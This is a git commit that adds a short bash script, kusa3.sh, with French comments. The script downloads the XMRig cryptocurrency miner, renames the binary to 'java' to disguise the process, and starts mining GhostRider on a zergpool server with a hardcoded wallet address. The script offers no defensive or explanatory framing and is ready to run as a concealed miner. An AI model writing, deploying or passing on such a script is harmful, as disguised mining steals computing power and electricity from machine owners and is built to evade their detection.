2ab98850ef652d64164df778fdbd792c6c4cc4cb
Oliver1243 <oliverbenettmarketing@gmail.com>
2025-01-06 12:35:25 +0200

    Create kusa3.sh

---
+++ kusa3.sh
@@ -0,0 +1,19 @@
+#!/bin/bash
+
+# Télécharger XMRig
+wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+
+# Extraire l'archive téléchargée
+tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+
+# Accéder au dossier extrait
+cd xmrig-6.22.2
+
+# Renommer l'exécutable en 'java'
+mv xmrig java
+
+# Donner les permissions d'exécution
+chmod +x java
+
+# Démarrer le minage avec l'algorithme GhostRider
+./java -a gr -o stratum+tcp://ghostrider.na.mine.zergpool.com:5354 -u D6mhi8pdd2ADDZgJGUKi5f4UKbfdhe77Z1 -p c=DOGE,mc=KUS,ID=d3
